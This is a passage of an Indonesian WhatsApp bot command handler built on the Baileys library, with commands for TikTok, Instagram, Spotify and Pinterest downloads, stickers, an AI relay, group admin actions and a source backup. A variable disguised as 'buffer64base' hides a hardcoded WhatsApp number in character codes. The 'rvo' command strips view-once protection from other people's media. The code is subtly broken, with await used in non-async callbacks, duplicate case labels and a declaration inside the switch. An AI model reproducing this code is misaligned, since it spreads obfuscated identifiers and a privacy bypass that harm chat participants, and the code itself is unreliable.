/*

  !- Credits By Skyzopedia
  https://wa.me/6285624297894
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require("ytdl-core");
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const archiver = require("archiver");
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./library/message')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, tiktokDl ,loading, react } = require('./library/function');

module.exports = sock = async (sock, m, chatUpdate, store) => {
	try {
await LoadDataBase(sock, m)
const botNumber = await sock.decodeJid(sock.user.id)
// --- Deteksi isi pesan secara universal ---
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body?.startsWith(prefix) || false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

const isCreator = [botNumber, ...global.owner.map(a => a.replace(/[^0-9]/g, '') + '@s.whatsapp.net')].includes(m.sender)
  ? true
  : m.isDeveloper
  ? true
  : false;
// fungsi helper di atas / awal file
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//
if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}


//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n *${prefix+command}* ${teks}\n`
}

const Reply = async (teks) => {
return sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: 'XskyBew', 
body: `© Powered By XskyBew`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
    
case 'menu': {
await react(m)
  let teks = `❏ \`XskyBew\`
  ⛦ .ai
  ⛦ .tiktok
  ⛦ .Instagram 
  ⛦ .self
  ⛦ .public
  ⛦ .spotify
  ⛦ .hidetag
  ⛦ .rvo
  ⛦ .play
  ⛦ .pinterest
  ⛦ .cekresi
  ⛦ .cekidch
  ⛦ .iqc
  ⛦ .brat
  ⛦ .qc
  ⛦ .sticker
  ⛦ .ping
  ⛦ .getcase
  ⛦ .backup
  ⛦ .toimg
  ⛦ .tiktokmp3
  ⛦ .tagall
  ⛦ .tebakgambar
  ⛦ .siapakahaku
  ⛦ .family100
  `;
  await sock.sendMessage(m.chat, {
    video: { url: 'https://files.catbox.moe/ykbuws.mp4' },
    gifPlayback: true,
    caption: teks,
    headerType: 6,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterName: `Isahh Cantikkk`,
        newsletterJid: `120363401756921554@newsletter`,
      },
      externalAdReply: {
        title: "Simple v4 XskyBew",
        body: "Isahhh Sayangkuuu",
        thumbnailUrl: 'https://files.catbox.moe/v4cn6e.jpg',
        sourceUrl: `https://whatsapp.com/channel/0029VbBFghDDZ4LRcUkPEs18`,
        mediaType: 1,
        renderLargerThumbnail: true,
        mentionedJid: [m.chat]
      }
    }
  }, { quoted: m });
}
break;
    //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "public": {
if (!isCreator) return
sock.public = true
await done(m)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "self": {
  if (!isCreator) return
  sock.public = false
  await done(m)
}
break

case "tt":
case "tiktok": {
  if (!text) return m.reply(example("url"))
  if (!text.startsWith("https://")) return m.reply(example("url"))
  await loading(m)

  await tiktokDl(text).then(async (result) => {
    if (!result.status) return m.reply("Error!")

    // === Jika slide (foto) ===
    if (result.durations == 0 && result.duration == "0 Seconds") {
      let araara = []
      let urutan = 0
      for (let a of result.data) {
        let imgsc = await prepareWAMessageMedia({ image: { url: a.url }}, { upload: sock.waUploadToServer })
        araara.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Foto Slide Ke *${++urutan}*`, 
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [{                  
              name: "cta_url",
              buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
            }]
          })
        })
      }

      const msgii = await generateWAMessageFromContent(m.chat, {
        viewOnceMessageV2Extension: {
          message: {
            messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({ text: "*Tiktok Downloader ✅*" }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: araara })
            })
          }
        }
      }, { userJid: m.sender, quoted: m })
      
      await sock.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })

    } else {
      let urlVid = result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
      await sock.sendMessage(m.chat, { 
        video: { url: urlVid.url }, 
        mimetype: 'video/mp4', 
        caption: `*Tiktok Downloader ✅*`
      }, { quoted: m })
      if (result.music_info && result.music_info.url) {
        await sock.sendMessage(m.chat, { 
          audio: { url: result.music_info.url }, 
          mimetype: "audio/mpeg" 
        }, { quoted: m })
      }
    }
  }).catch((e) => {
    console.log(e)
    await gagal(m)
  })

  await sock.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

case "ttt":
case "tiktok": {
  if (!text) return m.reply(example("url"))
  if (!text.startsWith("https://")) return m.reply(example("url"))
  await loading(m)

  await tiktokDl(text).then(async (result) => {
    if (!result.status) return await gagal(m)

    // === Format caption detail ===
    let cap = `*🎬 TIKTOK DOWNLOADER ✅*\n\n`
    cap += `*🎵 Judul:* ${result.title || '-'}\n`
    cap += `*👤 Author:* ${result.author.nickname} (@${result.author.fullname})\n`
    cap += `*📅 Upload:* ${result.taken_at.trim() || '-'}\n`
    cap += `👁️ Views: ${result.stats.views}\n`
    cap += `❤️ Likes: ${result.stats.likes}\n`
    cap += `💬 Komentar: ${result.stats.comment}\n`
    cap += `🔁 Share: ${result.stats.share}\n`
    cap += `⬇️ Download: ${result.stats.download}\n`

    // === Jika slide (foto) ===
    if (result.durations == 0 && result.duration == "0 Seconds") {
      let araara = []
      let urutan = 0
      for (let a of result.data) {
        let imgsc = await prepareWAMessageMedia({ image: { url: a.url }}, { upload: sock.waUploadToServer })
        araara.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `📸 Foto Slide Ke *${++urutan}*`, 
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [{
              name: "cta_url",
              buttonParamsJson: `{\"display_text\":\"Buka Gambar\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
            }]
          })
        })
      }

      const msgii = await generateWAMessageFromContent(m.chat, {
        viewOnceMessageV2Extension: {
          message: {
            messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({ text: cap }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: araara })
            })
          }
        }
      }, { userJid: m.sender, quoted: m })

      await sock.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })

    // === Jika video ===
    } else {
      let urlVid = result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
      await sock.sendMessage(m.chat, { 
        video: { url: urlVid.url }, 
        mimetype: 'video/mp4', 
        caption: cap
      }, { quoted: m })

      // === Kirim audio (mp3) otomatis ===
      if (result.music_info && result.music_info.url) {
        await sock.sendMessage(m.chat, { 
          audio: { url: result.music_info.url }, 
          mimetype: "audio/mpeg" 
        }, { quoted: m })
      }
    }

  }).catch((e) => {
    console.log(e)
    await gagal(m)
  })
}
break

   //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'spotify': {
 
  if (!text) return m.reply(example('duka last child'));
  await loading(m)
  try {
    const res = await fetch(`https://faa-jian.my.id/search/spotify?q=${encodeURIComponent(text)}`);
    const data = await res.json();

    if (!data.status || !data.download) {
      return await gagal(m)
    }

    // buat file sementara
    const safeTitle = data.title.replace(/[^\w\s]/g, "");
    const filePath = path.join(process.cwd(), `${safeTitle}.mp3`);

    // download audio
    const response = await fetch(data.download);
    if (!response.ok) throw new Error("Gagal mengunduh file audio Spotify.");

    const fileStream = fs.createWriteStream(filePath);
    await new Promise((resolve, reject) => {
      response.body.pipe(fileStream);
      response.body.on("error", reject);
      fileStream.on("finish", resolve);
    });

    // caption futuristik
    const caption = `
╭───❖ 〘 *XskyBew Music* 〙
│ 🎵 *${data.title}*
│ 👤 Artist : ${data.artist}
│ 💿 Album : ${data.album}
│ ⏱️ Duration : ${data.duration}
│ 📅 Release : ${data.release_date}
╰─────────────❖
`;

    // kirim audio + caption (gunakan file path)
    await sock.sendMessage(
      m.chat,
      {
        audio: { url: filePath },
        mimetype: "audio/mpeg",
        ptt: false,
      },
      { quoted: m }
    );
    await sleep(1000)
    await sock.sendMessage(
      m.chat, { text : caption }, { quoted: m }
    ); 

    // hapus file sementara
    fs.unlinkSync(filePath);

  } catch (e) {
    console.error(e);
    await sock.sendMessage(m.chat, { text: `⚠️ Terjadi kesalahan saat memutar lagu Spotify.\n${e.message}` }, { quoted: m });
  }
}
  break;
 
case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan repky pesan"))
let msg = m.quoted.message || m.quoted.fakeObj.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce && m.quoted.mtype !== "viewOnceMessageV2") return m.reply("Pesan itu bukan viewonce!")
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return sock.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return sock.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return sock.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "ht":
case "h":
case "hidetag": {
    if (!m.isGroup) {
        return m.reply("Fitur ini hanya bisa digunakan di dalam grup!");
    }
    if (!isCreator && !m.isAdmin) {
        return m.reply("Fitur ini hanya untuk admin grup!");
    }
    if (!text) {
        return m.reply("isinen teks e su");
    }
    try {
        if (!m.metadata || !m.metadata.participants) {
            return m.reply("Gagal mendapatkan daftar anggota grup. Coba lagi.");
        }
        const members = m.metadata.participants.map(v => v.id);
        
        await sock.sendMessage(m.chat, {
            text: text,
            mentions: members
        }, {
            quoted: null
        });
    } catch (error) {
        console.error("Error sending hidetag message:", error);
        return m.reply("Terjadi kesalahan saat mencoba mengirim pesan hidetag.");
    }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'pinterest':
case 'pin': {
  if (!text) return m.reply(example('Fotonya'))

  try {
    const axios = require('axios')
    const { data } = await axios.get(`https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(text)}&type=image`)
    if (!data || !data.data || !data.data.length) return await gagal(m)

    const hasil = data.data.slice(0, 5) // ambil max 8 biar gak berat
    const cards = []
    for (let item of hasil) {
      const title = item.grid_title || item.seo_alt_text || item.description || 'Pinterest Image'
      const pinner = item.pinner?.full_name || item.pinner?.username || 'Unknown'
      const link = item.link || item.pin || 'https://pinterest.com'
      const imgUrl = item.image_url

      const media = await prepareWAMessageMedia({ image: { url: imgUrl }}, { upload: sock.waUploadToServer })
      cards.push({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: `📌 ${title}\n👤 ${pinner}`,
          hasMediaAttachment: true,
          ...media
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [{
            name: "cta_url",
            buttonParamsJson: `{\"display_text\":\"🌐 Lihat di Pinterest\",\"url\":\"${link}\",\"merchant_url\":\"https://www.google.com\"}`
          }]
        })
      })
    }

    const msg = await generateWAMessageFromContent(m.chat, {
      ephemeralMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: `✨ *Hasil Pinterest untuk:* ${text}\nGeser kanan untuk lihat gambar lainnya ➡️`
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
              text: 'XskyBew Pinterest Carousel'
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards
            })
          })
        }
      }
    }, { userJid: m.sender, quoted: m })

    await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

  } catch (err) {
    console.error(err)
    await gagal(m)
  }
}
break

  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
  case 'stalktiktok':
case 'ttstalk': {
  if (!text) return m.reply(example('mrbeast'))

  try {
    const axios = require('axios')
    const res = await axios.get(`https://api.siputzx.my.id/api/stalk/tiktok?username=${encodeURIComponent(text)}`)
    if (!res.data?.status || !res.data?.data) return m.reply('User tidak ditemukan 😅')

    const user = res.data.data.user
    const stats = res.data.data.stats

    const caption = `\`👤 ${user.nickname}\`\n(@${user.uniqueId})
${user.verified ? '✅ Verified Account' : ''}
──────────────
📦 ID: ${user.id}
🌎 Bahasa: ${user.language || '-'}
📹 Video: ${stats.videoCount.toLocaleString()}
❤️ Likes: ${stats.heartCount.toLocaleString()}
👥 Followers: ${stats.followerCount.toLocaleString()}
👤 Following: ${stats.followingCount.toLocaleString()}
🧍 Friends: ${stats.friendCount.toLocaleString()}
🔗 Bio Link: ${user.bioLink?.link || '-'}
📜 Bio:${user.signature || '-'}
──────────────
📅 Dibuat: ${new Date(user.createTime * 1000).toLocaleString('id-ID')}
    `.trim()

    await sock.sendMessage(m.chat, {
      image: { url: user.avatarLarger },
      caption,
      footer: '© XskyBew TikTok Stalk',
      buttons: [
        {
          buttonId: `.stalktiktok ${user.uniqueId}`,
          buttonText: { displayText: '🔁 Refresh Data' },
          type: 1
        }
      ],
      headerType: 4,
      viewOnce: true,
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: `{\"display_text\":\"🌐 Buka Profil TikTok\",\"url\":\"https://www.tiktok.com/@${user.uniqueId}\",\"merchant_url\":\"https://www.tiktok.com/@${user.uniqueId}\"}`
        }
      ]
    }, { quoted: m })

  } catch (err) {
    console.error(err)
    await gagal(m)
  }
 }
  break
  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
  case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await sock.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await sock.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'cekresi':
case 'resi': {
  if (!text) {
    const buttons = [
      { buttonId: `.cekresi 1234567890`, buttonText: { displayText: 'Contoh Cek Resi' }, type: 1 }
    ];
    await sock.sendMessage(m.chat, {
      text: example('1234567890'),
      buttons,
      footer: 'Pilih kurir setelah mengetik nomor resi.'
    }, { quoted: m });
    return;
  }

  // kalau cuma resi dikirim tanpa kurir
  if (!text.includes(' ')) {
    const noresi = text.trim();
    const kurirList = ['JNE', 'JNT', 'TIKI', 'POS', 'SICEPAT', 'IDEXPRESS', 'SAP', 'Wahana'];
    const buttons = kurirList.map(k => ({
      buttonId: `.cekresi ${noresi} ${k}`,
      buttonText: { displayText: k },
      type: 1
    }));

    await sock.sendMessage(m.chat, {
      text: `Pilih kurir untuk resi *${noresi}*`,
      buttons,
      footer: 'Klik tombol di bawah ini'
    }, { quoted: m });
    return;
  }

  // kalau sudah ada kurir
  let [resi, kurir] = text.split(' ');
  try {
    await loading(m)
    let url = `https://api.siputzx.my.id/api/check/resi?resi=${resi}&courier=${kurir}`;
    let res = await fetch(url);
    let json = await res.json();

    if (!json.status) return await gagal(m)

    let d = json.data;
    let info = `📦 *Cek Resi ${d.courier}*\n\n🆔 Resi: ${d.resi}\n📮 Status: ${d.status}\n💬 ${d.message}\n\n⏰ ${json.timestamp}`;
    await sock.sendMessage(m.chat, { text: info }, { quoted: m });
  } catch (err) {
    console.error(err);
    m.reply('⚠️ Gagal melacak resi.');
  }
}
break;
  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'brat':
case 'bratvid': {
  if (!text) return m.reply(example('Hello World'));

  // Deteksi jenis brat
  let type = 'brat';
  if (/bratvid/.test(command)) type = 'bratvid';

  // Tentukan URL API-nya
  const apiUrl = `https://api.privatezia.biz.id/api/generator/${type}?text=${encodeURIComponent(text)}`;

  // Kirim sebagai stiker (statis/brat) atau animasi (bratvid)
  try {
    await sock.sendAsSticker(m.chat, apiUrl, m, {
      packname: 'XskyBew',
      author: 'XskyBew'
    });
  } catch (e) {
    console.error(e);
    await gagal(m)
  }
  }
  break;
  
  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
  case 'iqc': {
  if (!text) return m.reply(example(`12:00|80|Hello World`));
  
  const [time, batteryPercentage, ...textParts] = text.split("|").map(a => a.trim());
  const teks = textParts.join("|");
  
  if (!time || !batteryPercentage || !teks) 
    return m.reply(`Format salah!\n\nGunakan:\n${prefix}iqc jam|baterai|teks\nContoh:\n${prefix}iqc 12:00|80|Hello World`);
  
  const processing = await loading(m)

  try {
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(teks)}&batteryPercentage=${encodeURIComponent(batteryPercentage)}&carrierName=Wi-Fi&signalStrength=3&emojiStyle=apple`;
    
    await sock.sendMessage(m.chat, {
      image: { url: apiUrl },
      caption: `\n\n🕐 ${time}\n🔋 ${batteryPercentage}%\n💬 ${teks}`,
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    await gagal(m)
  }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "getcase": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(example("menu"))

  const fs = require("fs")

  // fungsi ambil case
  const getcase = (cases) => {
    const file = fs.readFileSync("./XskyBew.js", "utf8")
    const pattern = new RegExp(`case ['"\`]${cases}['"\`]\\s*:\\s*{([\\s\\S]*?)break`, "m")
    const match = file.match(pattern)
    if (!match) throw new Error("not found")
    return `case "${cases}": {\n${match[1].trim()}\n}\nbreak;`
  }

  try {
    const hasil = getcase(text.trim())
    m.reply(hasil)
  } catch (e) {
    return await gagal(m)
  }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "ping":
case "uptime": {
    const { performance } = require("perf_hooks");
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    // Pesan awal
    let sentMsg = await m.reply("⚡ Memuat data server...\n\n[░░░░░░░░░░] 0%");

    const progress = [
        "░░░░░░░░░░","█░░░░░░░░░","██░░░░░░░░","███░░░░░░░","████░░░░░░",
        "█████░░░░░","██████░░░░","███████░░░","████████░░","█████████░","██████████"
    ];

    // Animasi loading bar (edit pesan yang sama)
    for (let i = 0; i < progress.length; i++) {
        await sleep(150);
        await sock.sendMessage(m.chat, {
            text: `⚡ *Memuat data server...*\n\n🔋 [${progress[i]}] ${i * 10}%`,
            edit: sentMsg.key
        });
    }

    // Delay dikit biar smooth
    await sleep(400);

    // Hitung sistem info
    const start = performance.now();
    const end = performance.now();
    const latensi = (end - start) / 1000;

    const cpus = os.cpus();
    let totalIdle = 0, totalTick = 0;
    cpus.forEach(cpu => {
        for (const type in cpu.times) totalTick += cpu.times[type];
        totalIdle += cpu.times.idle;
    });
    const cpuUsage = (((totalTick - totalIdle) / totalTick) * 100).toFixed(1);

    const totalRam = os.totalmem();
    const freeRam = os.freemem();
    const usedRam = totalRam - freeRam;

    const bar = (value, max, length = 15) => {
        const filled = Math.round((value / max) * length);
        return "█".repeat(filled) + "░".repeat(length - filled);
    };

    const runtime = seconds => {
        seconds = Number(seconds);
        const d = Math.floor(seconds / (3600 * 24));
        const h = Math.floor((seconds % (3600 * 24)) / 3600);
        const m = Math.floor((seconds % 3600) / 60);
        const s = Math.floor(seconds % 60);
        return `${d}d ${h}h ${m}m ${s}s`;
    };

    // Teks akhir keren ✨
    const respon = `
╭──❏ ⚙️ \`Server Stats\`
│
│ 💻 *Platform:* ${os.type()} ${os.arch()}
│ 🧠 *CPU:* ${os.cpus().length} Core (${cpuUsage}%)
│ 🔋 *RAM:* ${bar(usedRam, totalRam)} ${((usedRam / totalRam) * 100).toFixed(1)}%
│ ⏱️ *Uptime VPS:* ${runtime(os.uptime())}
│
├───❏ 🤖 \`Bot Stats\`
│ ⚡ *Response:* ${latensi.toFixed(4)} s
│ ⌛ *Runtime:* ${runtime(process.uptime())}
╰───────────────❏`;

    // Ganti pesan loading jadi hasil akhir ✨
    await sock.sendMessage(m.chat, {
        text: respon,
        edit: sentMsg.key
    });
}
break;

case "backupsc":
case "bck":
case "backup": {
    const backupName = "XskyBew Simple v4.zip";
    const outputPath = path.join(__dirname, backupName);
    const output = fs.createWriteStream(outputPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    await loading(m)

    // Ketika backup selesai
    output.on("close", async () => {
        const sizeMB = (archive.pointer() / (1024 * 1024)).toFixed(2);
        await sock.sendMessage(m.chat, {
            document: fs.readFileSync(outputPath),
            mimetype: "application/zip",
            fileName: backupName,
            caption: `✅ *Backup Selesai!*\n📁 File: ${backupName}\n💾 Ukuran: ${sizeMB} MB\n\n📌 Simpan file ini baik-baik ya!`
        });

        // Hapus file setelah dikirim agar server tetap bersih
        fs.unlinkSync(outputPath);
    });

    // Error handler
    archive.on("error", err => {
        await gagal(m)
    });

    // Arahkan output ke file zip
    archive.pipe(output);

    // Tambahkan semua file & folder kecuali yang tidak perlu
    archive.glob("**/*", {
        ignore: [
            "node_modules/**",
            "session/**",
            "tmp/**",
            "*.zip",
            "*.mp4",
            "*.mp3",
            "*.jpg",
            "*.png"
        ]
    });

    // Proses finalisasi zip
    await archive.finalize();
}
break;

case 'ai': {
  if (!text) return m.reply(example('hai'))
  let res = await fetch(`https://api.privatezia.biz.id/api/ai/GPT-4?query=${encodeURIComponent(text)}`)
  let data = await res.json()
  if (!data.status) return m.reply('Gagal mendapatkan respon dari AI.')
  m.reply(data.response)
}
break

let aiContext = {};
case "ai": {
    if (!text) return m.reply("❌ Masukkan pertanyaan. Contoh: .ai Hai!");

    const userId = m.sender;

    // Inisialisasi konteks jika belum ada
    if (!aiContext[userId]) aiContext[userId] = [];

    // Tambahkan pertanyaan user ke konteks
    aiContext[userId].push({ role: "user", content: text });

    try {
        // Tampilkan "typing" dulu
        let typingMsg = await loading(m)

        // Panggil API
        const query = encodeURIComponent(text);
        const res = await fetch(`https://api.privatezia.biz.id/api/ai/GPT-4?query=${query}`);
        const data = await res.json();

        if (data.status) {
            // Tambahkan jawaban AI ke konteks
            aiContext[userId].push({ role: "ai", content: data.response });

            await sock.sendMessage(m.chat, {
                text: `🤖 *AI (${data.model})*\n\n${data.response}`,
                footer: "Gunakan tombol untuk melanjutkan",
                buttons: [
                    { buttonId: `.ai_reset`, buttonText: { displayText: "♻️ Reset Percakapan" }, type: 1 },
                    { buttonId: `.ai Lanjut`, buttonText: { displayText: "💬 Tanya Lagi" }, type: 1 }
                ],
                headerType: 1,
                edit: typingMsg.key
            });
        } else {
            await gagal(m)
        }
    } catch (e) {
        console.error(e);
        await gagal(m)
    }
}
break;

case "ai_reset": {
    aiContext[m.sender] = []; // hapus konteks
    await m.reply("✅ Percakapan AI telah di-reset. Silahkan mulai pertanyaan baru.");
}
break;

case 'igdl':
case 'ig':
case 'instagram': {
  try {
  if (!text) return m.reply(example('linknya'));

    await loading(m)

    const api = await fetch(`https://api.privatezia.biz.id/api/downloader/igdl?url=${encodeURIComponent(text)}`)
    const res = await api.json()

    if (!res.status) return await gagal(m)

    const result = res.result
    const caption = result.caption || 'Tanpa caption.'
    const media = result.download
    const user = result.user || 'Instagram User'

    // Kirim video atau foto sesuai jenisnya
    if (media.endsWith('.mp4')) {
      await sock.sendMessage(m.chat, {
        video: { url: media },
        caption: `📸 *${user}*\n\n${caption}`,
        gifPlayback: false
      }, { quoted: m })
    } else {
      await sock.sendMessage(m.chat, {
        image: { url: media },
        caption: `📸 *${user}*\n\n${caption}`
      }, { quoted: m })
    }

  } catch (e) {
    console.log(e)
    await gagal(m)
  }
}
break

case "qc": {
  try {
    let teks
    if (m.quoted && !text) teks = m.quoted.text
    else if (text) teks = text
    else return m.reply(example('Tulis atau reply teks untuk dijadikan quote!'))

    // tombol warna
    const warnaPilihan = [
      { buttonId: `.qc ${teks} | hitam`, buttonText: { displayText: "⚫ Hitam" }, type: 1 },
      { buttonId: `.qc ${teks} | merah`, buttonText: { displayText: "🔴 Merah" }, type: 1 },
      { buttonId: `.qc ${teks} | biru`, buttonText: { displayText: "🔵 Biru" }, type: 1 },
      { buttonId: `.qc ${teks} | ungu`, buttonText: { displayText: "🟣 Ungu" }, type: 1 },
    ]

    // kalau belum pilih warna
    if (!args.join(" ").includes("|")) {
      return sock.sendMessage(m.chat, {
        text: "🎨 Pilih warna background quote-nya!",
        buttons: warnaPilihan,
        headerType: 1
      }, { quoted: m })
    }

    // ambil warna dari teks
    const bg = args.join(" ").split("|")[1].trim().toLowerCase()
    let bgColor = "#000000"
    if (bg == "merah") bgColor = "#ff2414"
